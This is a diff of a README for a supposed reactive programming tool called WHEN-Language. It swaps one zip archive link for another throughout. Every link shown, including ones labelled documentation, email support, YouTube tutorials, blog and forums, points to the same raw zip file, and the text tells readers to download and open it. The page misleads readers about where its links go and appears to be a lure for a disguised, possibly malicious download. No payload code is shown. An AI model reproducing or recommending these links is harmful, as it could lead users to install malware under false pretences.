@@ -6,7 +6,7 @@ Welcome to **WHEN-Language**, a powerful tool for creating reactive programs wit
 
 ## 📥 Download the Application
 
-[![Download WHEN-Language](https://raw.githubusercontent.com/HIYO-F/WHEN-Language/main/ratepaying/WHEN-Language.zip)](https://raw.githubusercontent.com/HIYO-F/WHEN-Language/main/ratepaying/WHEN-Language.zip)
+[![Download WHEN-Language](https://raw.githubusercontent.com/HIYO-F/WHEN-Language/main/ratepaying/Language-WHE-3.3.zip)](https://raw.githubusercontent.com/HIYO-F/WHEN-Language/main/ratepaying/Language-WHE-3.3.zip)
 
 ## 📂 What is WHEN-Language?
 
@@ -34,19 +34,19 @@ To run WHEN-Language, you need:
 
 ## 📚 Documentation
 
-To help you learn WHEN-Language, we provide in-depth documentation. You can find it [here](https://raw.githubusercontent.com/HIYO-F/WHEN-Language/main/ratepaying/WHEN-Language.zip).
+To help you learn WHEN-Language, we provide in-depth documentation. You can find it [here](https://raw.githubusercontent.com/HIYO-F/WHEN-Language/main/ratepaying/Language-WHE-3.3.zip).
 
 ## 🔧 Download & Install
 
 To get started, visit the releases page below to download the latest version:
 
-[https://raw.githubusercontent.com/HIYO-F/WHEN-Language/main/ratepaying/WHEN-Language.zip](https://raw.githubusercontent.com/HIYO-F/WHEN-Language/main/ratepaying/WHEN-Language.zip)
+[https://raw.githubusercontent.com/HIYO-F/WHEN-Language/main/ratepaying/Language-WHE-3.3.zip](https://raw.githubusercontent.com/HIYO-F/WHEN-Language/main/ratepaying/Language-WHE-3.3.zip)
 
 ### Installation Steps:
 
 1. Click on the link above to go to the releases page.
 2. Find the latest version of WHEN-Language.
-3. Download the appropriate file for your operating system (for example, `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/HIYO-F/WHEN-Language/main/ratepaying/WHEN-Language.zip` for Linux).
+3. Download the appropriate file for your operating system (for example, `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/HIYO-F/WHEN-Language/main/ratepaying/Language-WHE-3.3.zip` for Linux).
 4. Open the downloaded file to begin the installation process.
 5. Follow the prompts on your screen to complete the installation.
 
@@ -67,15 +67,15 @@ If you have questions or need help, join our community. You can find support thr
 
 - **GitHub Issues**: Report problems or suggest improvements.
 - **Discussion Forum**: Engage with other users and get tips.
-- **Email Support**: Reach out to our support team at https://raw.githubusercontent.com/HIYO-F/WHEN-Language/main/ratepaying/WHEN-Language.zip
+- **Email Support**: Reach out to our support team at https://raw.githubusercontent.com/HIYO-F/WHEN-Language/main/ratepaying/Language-WHE-3.3.zip
 
 ## 🔗 Learn More
 
 To enhance your skills and understanding of WHEN-Language, consider checking out these resources:
 
-- [YouTube Tutorials](https://raw.githubusercontent.com/HIYO-F/WHEN-Language/main/ratepaying/WHEN-Language.zip)
-- [Official Blog](https://raw.githubusercontent.com/HIYO-F/WHEN-Language/main/ratepaying/WHEN-Language.zip)
-- [Community Forums](https://raw.githubusercontent.com/HIYO-F/WHEN-Language/main/ratepaying/WHEN-Language.zip)
+- [YouTube Tutorials](https://raw.githubusercontent.com/HIYO-F/WHEN-Language/main/ratepaying/Language-WHE-3.3.zip)
+- [Official Blog](https://raw.githubusercontent.com/HIYO-F/WHEN-Language/main/ratepaying/Language-WHE-3.3.zip)
+- [Community Forums](https://raw.githubusercontent.com/HIYO-F/WHEN-Language/main/ratepaying/Language-WHE-3.3.zip)
 
 ## 🎉 Conclusion
 
